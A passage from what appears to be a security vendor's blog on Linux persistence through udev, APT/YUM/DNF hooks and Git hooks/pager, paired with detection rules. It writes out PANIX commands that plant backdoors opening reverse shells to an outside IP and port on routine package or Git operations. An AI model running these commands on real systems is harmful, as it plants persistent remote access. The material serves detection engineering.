<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Category</th><th>Coverage</th></tr></thead><tbody><tr><td>File</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_udev_rule_creation.toml">Systemd-udevd Rule File Creation</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml">Potential Persistence via File Modification</a></td></tr><tr><td>Process</td><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_at_utility_launched_through_udevadm.toml">At Utility Launched through Udevadm</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_potential_persistence_script_executable_bit_set.toml">Executable Bit Set for Potential Persistence Script</a></td></tr><tr><td>Network</td><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_udev_execution_followed_by_egress_network_connection.toml">Udev Execution Followed by Egress Network Connection</a></td></tr></tbody></table></div>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="hunting-for-t1546---udev" class="absolute -top-32"></span>Hunting for T1546 - udev</h3>
<p>Hunting for Udev persistence can be conducted through ES|QL and OSQuery. By leveraging ES|QL, we can detect unusual file creations and process executions, and through OSQuery we can do live hunting on our managed systems. To get you started, we created the <a href="https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_udev.toml">Persistence via Udev</a> rule, containing several different queries.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="t1546016---event-triggered-execution-installer-packages" class="absolute -top-32"></span>T1546.016 - event triggered execution: installer packages</h2>
<p>Package managers are tools responsible for installing, updating, and managing software packages. Three widely used package managers are <a href="https://linux.die.net/man/8/apt">APT</a> (Advanced Package Tool), <a href="https://man7.org/linux/man-pages/man8/yum.8.html">YUM</a> (Yellowdog Updater, Modified), and YUM’s successor, <a href="https://man7.org/linux/man-pages/man8/dnf.8.html">DNF</a> (Danified YUM). Beyond their legitimate uses, these tools can be leveraged by attackers to establish persistence on a system by hijacking the package manager execution flow, ensuring malicious code is executed during routine package management operations. MITRE details information related to this technique under the identifier <a href="https://attack.mitre.org/techniques/T1546/016/">T1546.016</a>.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="t1546016---installer-packages-apt" class="absolute -top-32"></span>T1546.016 - installer packages (APT)</h3>
<p><a href="https://linux.die.net/man/8/apt">APT</a> is the default package manager for Debian-based Linux distributions like Debian, Ubuntu, and their derivatives. It simplifies the process of managing software packages and dependencies. APT utilizes several configuration mechanisms to customize its behavior and enhance package management efficiency.</p>
<p><a href="https://manpages.debian.org/testing/apt/apt.conf.5.en.html">APT hooks</a> allow users to execute scripts or commands at specific points during package installation, removal, or upgrade operations. These hooks are stored in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/apt/apt.conf.d/</code> and can be leveraged to execute actions pre- and post-installation. The structure of APT configuration files follows a numeric ordering convention to control the application of configuration snippets that customize various aspects of APT&#x27;s behavior. A regular APT hook looks like this:</p>
<pre><code>DPkg::Post-Invoke {&quot;if [ -d /var/lib/update-notifier ]; then touch /var/lib/update-notifier/dpkg-run-stamp; fi; /usr/lib/update-notifier/update-motd-updates-available 2&gt;/dev/null || true&quot;;};                                                                            APT::Update::Post-Invoke-Success {&quot;/usr/lib/update-notifier/update-motd-updates-available 2&gt;/dev/null || true&quot;;};</code></pre>
<p>These configuration files can be exploited by attackers to execute malicious binaries or code whenever an APT operation is executed. This vulnerability extends to automated processes like auto-updates, enabling persistent execution on systems with automatic update features enabled.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="persistence-through-t1546016---installer-packages-apt" class="absolute -top-32"></span>Persistence through T1546.016 - installer packages (APT)</h4>
<p>To test this method, a Debian-based system that leverages APT or the manual installation of APT is required. Make sure that if you perform this step manually, that you do not break the APT package manager, as <a href="https://github.com/Aegrah/PANIX/blob/main/panix.sh#L2021C4-L2021C138">a carefully crafted payload</a> that detaches and runs in the background is necessary to not interrupt the execution chain. You can setup APT persistence by running:</p>
<pre><code>&gt; sudo ./panix.sh --package-manager --ip 192.168.1.1 --port 2012 --apt
&gt; [+] APT persistence established</code></pre>
<p>To trigger the payload, run an APT command, such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sudo apt update</code>. This will spawn a reverse shell. Let’s take a look at the events in Discover:</p>
<p></p>
<p>In the figure above, we see PANIX being executed, creating the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">01python-upgrades</code> file, and successfully establishing the APT hook. After running <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sudo apt update</code>, APT reads the configuration file and executes the payload, initiating the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sh</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nohup</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">setsid</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">bash</code> reverse shell chain. Our coverage is multi-layered, and detects the following events:</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Category</th><th>Coverage</th></tr></thead><tbody><tr><td>File</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_apt_package_manager_file_creation.toml">APT Package Manager Configuration File Creation</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml">Potential Persistence via File Modification</a></td></tr><tr><td>Process</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_apt_package_manager_execution.toml">Suspicious APT Package Manager Execution</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_apt_package_manager_command_execution.toml">APT Package Manager Command Execution</a></td></tr><tr><td>Network</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_apt_package_manager_netcon.toml">Suspicious APT Package Manager Network Connection</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_apt_package_manager_egress_network_connection.toml">APT Package Manager Egress Network Connection</a></td></tr></tbody></table></div>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="t1546016---installer-packages-yum" class="absolute -top-32"></span>T1546.016 - installer packages (YUM)</h3>
<p><a href="https://man7.org/linux/man-pages/man8/yum.8.html">YUM</a> (Yellowdog Updater, Modified) is the default package management system used in Red Hat-based Linux distributions like CentOS and Fedora. YUM employs <a href="https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/6/html/deployment_guide/sec-yum_plugins">plugin architecture</a> to extend its functionality, allowing users to integrate custom scripts or programs that execute at various stages of the package management lifecycle. These plugins are stored in specific directories and can perform actions such as logging, security checks, or custom package handling.</p>
<p>The structure of YUM plugins typically involves placing them in directories like:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/yum/pluginconf.d/</code> (for configuration files)</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/yum-plugins/</code> (for plugin scripts)</li>
</ul>
<p>For plugins to be enabled, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/yum.conf</code> file must have the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">plugins=1</code> set. These plugins can intercept YUM operations, modify package installation behaviors, or execute additional actions before or after package transactions. YUM plugins are quite extensive, but a basic YUM plugin template might look like <a href="http://yum.baseurl.org/wiki/WritingYumPlugins.html">this</a>:</p>
<pre><code>from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE

requires_api_version = &#x27;2.3&#x27;
plugin_type = (TYPE_CORE, TYPE_INTERACTIVE)

def init_hook(conduit):
    conduit.info(2, &#x27;Hello world&#x27;)

def postreposetup_hook(conduit):
    raise PluginYumExit(&#x27;Goodbye&#x27;)</code></pre>
<p>Each plugin must be enabled through a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.conf</code> configuration file:</p>
<pre><code>[main]                                                                                                                               enabled=1</code></pre>
<p>Similar to APT&#x27;s configuration files, YUM plugins can be leveraged by attackers to execute malicious code during routine package management operations, particularly during automated processes like system updates, thereby establishing persistence on vulnerable systems.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="persistence-through-t1546016---installer-packages-yum" class="absolute -top-32"></span>Persistence through T1546.016 - Installer Packages (YUM)</h4>
<p>Similar to APT, YUM plugins should be crafted carefully to not interfere with the YUM update execution flow. Use <a href="https://github.com/Aegrah/PANIX/blob/main/panix.sh#L2025-L2047">this example</a> or set it up by running:</p>
<pre><code>&gt; sudo ./panix.sh --package-manager --ip 192.168.1.1 --port 2012 --yum
[+] Yum persistence established</code></pre>
<p>After planting the persistence mechanism, a command similar to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sudo yum upgrade</code> can be run to establish a reverse connection.</p>
<p></p>
<p>We see PANIX being executed, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/yumcon</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/yum-plugins/yumcon.py</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/yum/pluginconf.d/yumcon.conf</code> being created. <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/yumcon</code> is executed by <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">yumcon.py</code>, which is enabled in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">yumcon.conf</code>. After updating the system, the reverse shell execution chain (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">yum</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sh</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">setsid</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">yumcon</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">python</code>) is executed. Similar to APT, our YUM coverage is multi-layered, and detects the following events:</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Category</th><th>Coverage</th></tr></thead><tbody><tr><td>File</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_yum_package_manager_plugin_file_creation.toml">Yum Package Manager Plugin File Creation</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml">Potential Persistence via File Modification</a></td></tr><tr><td>Process</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/discovery_yum_dnf_plugin_detection.toml">Yum/DNF Plugin Status Discovery</a></td></tr><tr><td>Network</td><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_egress_connection_by_a_yum_package_manager_descendant.toml">Egress Connection by a YUM Package Manager Descendant</a></td></tr></tbody></table></div>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="t1546016---installer-packages-dnf" class="absolute -top-32"></span>T1546.016 - installer packages (DNF)</h3>
<p><a href="https://man7.org/linux/man-pages/man8/dnf.8.html">DNF</a> (Dandified YUM) is the next-generation package manager used in modern Red Hat-based Linux distributions, including Fedora and CentOS. It replaces YUM while maintaining compatibility with YUM repositories and packages. Similar to YUM, DNF utilizes a <a href="https://docs.redhat.com/it/documentation/red_hat_enterprise_linux/9/html/managing_software_with_the_dnf_tool/assembly_configuring-yum_managing-software-with-the-dnf-tool#proc_enabling-and-disabling-yum-plug-ins_assembly_configuring-yum">plugin system</a> to extend its functionality, enabling users to integrate custom scripts or programs that execute at key points in the package management lifecycle.</p>
<p>DNF plugins enhance its capabilities by allowing customization and automation beyond standard package management tasks. These plugins are stored in specific directories:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/dnf/pluginconf.d/</code> (for configuration files)</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/python3.9/site-packages/dnf-plugins/</code> (for plugin scripts)</li>
</ul>
<p>Of course the location for the dnf-plugins are bound to the Python version that is running on your system. Similarly to YUM, to enable a plugin, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">plugins=1</code> must be set in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/dnf/dnf.conf</code>. An example of a DNF plugin can look like this:</p>
<pre><code>import dbus
import dnf
from dnfpluginscore import _

class NotifyPackagekit(dnf.Plugin):
	name = &quot;notify-packagekit&quot;

	def __init__(self, base, cli):
		super(NotifyPackagekit, self).__init__(base, cli)
		self.base = base
		self.cli = cli
	def transaction(self):
		try:
			bus = dbus.SystemBus()
			proxy = bus.get_object(&#x27;org.freedesktop.PackageKit&#x27;, &#x27;/org/freedesktop/PackageKit&#x27;)
			iface = dbus.Interface(proxy, dbus_interface=&#x27;org.freedesktop.PackageKit&#x27;)
			iface.StateHasChanged(&#x27;posttrans&#x27;)
		except:
			pass</code></pre>
<p>As for YUM, each plugin must be enabled through a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.conf</code> configuration file:</p>
<pre><code>[main]                                                                                                                               enabled=1</code></pre>
<p>Similar to YUM&#x27;s plugins and APT&#x27;s configuration files, DNF plugins can be exploited by malicious actors to inject and execute unauthorized code during routine package management tasks. This attack vector extends to automated processes such as system updates, enabling persistent execution on systems with DNF-enabled repositories.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="persistence-through-t1546016---installer-packages-dnf" class="absolute -top-32"></span>Persistence through T1546.016 - installer packages (DNF)</h4>
<p>Similar to APT and YUM, DNF plugins should be crafted carefully to not interfere with the DNF update execution flow. You can use the following <a href="https://github.com/Aegrah/PANIX/blob/main/panix.sh#L2049-L2069">example</a> or set it up by running:</p>
<pre><code>&gt; sudo ./panix.sh --package-manager --ip 192.168.1.1 --port 2013 --dnf
&gt; [+] DNF persistence established</code></pre>
<p>Running a command similar to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sudo dnf update</code> will trigger the backdoor. Take a look at the events:</p>
<p></p>
<p>After the execution of PANIX, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/python3.9/site-packages/dnfcon</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/dnf/plugins/dnfcon.conf</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/python3.9/site-packages/dnf-plugins/dnfcon.py</code> are created, and the backdoor is established. These locations are dynamic, based on the Python version in use. After triggering it through the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sudo dnf update</code> command, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">dnf</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sh</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">setsid</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">dnfcon</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">python</code> reverse shell chain is initiated. Similar to before, our DNF coverage is multi-layered, and detects the following events:</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Category</th><th>Coverage</th></tr></thead><tbody><tr><td>File</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_dnf_package_manager_plugin_file_creation.toml">DNF Package Manager Plugin File Creation</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml">Potential Persistence via File Modification</a></td></tr><tr><td>Process</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/discovery_yum_dnf_plugin_detection.toml">Yum/DNF Plugin Status Discovery</a></td></tr><tr><td>Network</td><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_egress_connection_by_a_dnf_package_manager_descendant.toml">Egress Connection by a DNF Package Manager Descendant</a></td></tr></tbody></table></div>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="hunting-for-persistence-through-t1546016---installer-packages" class="absolute -top-32"></span>Hunting for persistence through T1546.016 - installer packages</h3>
<p>Hunting for Package Manager persistence can be conducted through ES|QL and OSQuery. Indicators of compromise may include configuration and plugin file creations/modifications and unusual executions of APT/YUM/DNF parents. The <a href="https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_package_manager.toml">Persistence via Package Manager</a> rule contains several ES|QL/OSQuery queries that you can use to detect these abnormalities.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="t1546---event-triggered-execution-git" class="absolute -top-32"></span>T1546 - event triggered execution: Git</h2>
<p><a href="https://manpages.debian.org/stretch/git-man/git.1.en.html">Git</a> is a distributed version control system widely used for managing source code and coordinating collaborative software development. It tracks changes to files and enables efficient team collaboration across different locations. This makes Git a system that is present in a lot of organizations across both workstations and servers. Two functionalities that can be (ab)used for arbitrary code execution are <a href="https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks">Git hooks</a> and <a href="https://www.mslinn.com/git/200-git-pager.html">Git pager</a>. MITRE has no specific technique attributed to these persistence mechanisms, but they would best fit <a href="https://attack.mitre.org/techniques/T1546/">T1546</a>.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="t1546---event-triggered-execution-git-hooks" class="absolute -top-32"></span>T1546 - event triggered execution: Git hooks</h3>
<p><a href="https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks">Git hooks</a> are scripts that Git executes before or after specific events such as commits, merges, and pushes. These hooks are stored in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.git/hooks/</code> directory within each Git repository. They provide a mechanism for customizing and automating actions during the Git workflow. Common Git hooks include <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pre-commit</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">post-commit</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pre-merge</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">post-merge</code>.</p>
<p>An example of a Git hook would be the file <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.git/hooks/pre-commit</code>, with the following contents:</p>
<pre><code>#!/bin/sh
# Check if this is the initial commit
if git rev-parse --verify HEAD &gt;/dev/null 2&gt;&amp;1
then
    echo &quot;pre-commit: About to create a new commit...&quot;
    against=HEAD
else
    echo &quot;pre-commit: About to create the first commit...&quot;
    against=4b825dc642cb6eb9a060e54bf8d69288fbee4904
fi</code></pre>
<p>As these scripts are executed on specific actions, and the contents of the scripts can be changed in whatever way the user wants, this method can be abused for persistence. Additionally, this method does not require root privileges, making it a convenient persistence technique for instances where root privileges are not yet obtained. These scripts can also be added to Github repositories prior to cloning, turning them into initial access vectors as well.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="t1546---event-triggered-execution-git-pager" class="absolute -top-32"></span>T1546 - event triggered execution: git pager</h3>
<p>A <a href="https://en.wikipedia.org/wiki/Terminal_pager">pager</a> is a program used to view content one screen at a time. It allows users to scroll through text files or command output without the text scrolling off the screen. Common pagers include <a href="https://www.commandlinux.com/man-page/man1/pager.1.html">less</a>, <a href="https://man7.org/linux/man-pages/man1/more.1.html">more</a>, and <a href="https://man7.org/linux/man-pages/man1/pg.1.html">pg</a>. A <a href="https://www.mslinn.com/git/200-git-pager.html">Git pager</a> is a specific use of a pager program to display the output of Git commands. Git allows users to configure a pager to control the display of commands such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">git log</code>.</p>
<p>Git determines which pager to use through the following order of configuration:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/gitconfig</code> (system-wide)</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.gitconfig</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.config/git/config</code> (user-specific)</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.git/config</code> (repository specific)</li>
</ul>
<p>A typical configuration where a pager is specified might look like this:</p>
<pre><code>[core]
    pager = less</code></pre>
<p>In this example, Git is configured to use less as the pager. When a user runs a command like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">git log</code>, Git will pipe the output through less for easier viewing. The flexibility in specifying a pager can be exploited. For example, an attacker can set the pager to a command that executes arbitrary code. This can be done by modifying the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">core.pager</code> configuration to include malicious commands. Let’s take a look at the two techniques discussed in this section.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="persistence-through-t1546---git" class="absolute -top-32"></span>Persistence through T1546 - Git</h3>
<p>To test these techniques, the system requires a cloned Git repository. There is no point in setting up a custom repository, as the persistence mechanism depends on user actions, making a hidden and unused Git repository an illogical construct. You could initialize your own hidden repository and chain it together with a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cron</code>/<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">systemd</code>/<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">udev</code> persistence mechanism to initialize the repository on set intervals, but that is out of scope for now.</p>
<p>To test the Git Hook technique, ensure a Git repository is available on the system, and run:</p>
<pre><code>&gt; ./panix.sh --git --default --ip 192.168.1.1 --port 2014 --hook</code></pre>
<p><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">&gt; [+] Created malicious pre-commit hook in /home/ruben/panix</code></p>
<p>The program loops through the entire filesystem (as far as this is possible, based on permissions), finds all of the repositories, and backdoors them. To trigger the backdoor, run <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">git add -A</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">git commit -m &quot;backdoored!&quot;</code>. This will generate the following events:</p>
<p></p>
<p>In this figure we see PANIX looking for Git repositories, adding a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pre-commit</code> hook and granting it execution permissions, successfully planting the backdoor. Next, the backdoor is initiated through the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">git commit</code>, and the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">git</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pre-commit</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nohup</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">setsid</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">bash</code> reverse shell connection is initiated.</p>
<p>To test the Git pager technique, ensure a Git repository is available on the system and run:</p>
<pre><code>&gt; ./panix.sh --git --default --ip 192.168.1.1 --port 2015 --pager
&gt; [+] Updated existing Git config with malicious pager in /home/ruben/panix
&gt; [+] Updated existing global Git config with malicious pager</code></pre>
<p>To trigger the payload, move into the backdoored repository and run a command such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">git log</code>. This will trigger the following events:</p>
<p></p>
<p>PANIX executes and starts searching for Git repositories. Once found, the configuration files are updated or created, and the backdoor is planted. Invoking the Git Pager (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">less</code>) executes the backdoor, setting up the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">git</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sh</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nohup</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">setsid</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">bash</code> reverse connection chain.</p>
<p>We have several layers of detection, covering the Git Hook/Pager persistence techniques.</p>
